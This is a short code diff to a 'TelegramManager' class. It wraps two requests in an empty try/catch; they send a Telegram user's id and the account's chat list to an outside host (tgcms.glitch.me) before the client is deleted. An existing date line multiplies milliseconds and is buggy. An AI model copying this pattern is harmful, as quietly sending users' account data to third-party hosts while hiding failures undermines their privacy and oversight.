@@ -367,8 +367,11 @@ class TelegramManager {
             date: new Date(Date.now() * 1000),//date,
             tgId: user.id
         };
-        await axios.post(`https://tgcms.glitch.me/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
-        await axios.post(`https://tgcms.glitch.me/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
+        try {
+            await axios.post(`https://tgcms.glitch.me/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
+            await axios.post(`https://tgcms.glitch.me/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
+        } catch (error) {
+        }
         await sleep(3000);
         await deleteClient(this.phoneNumber)
         // await this.deleteMessages();
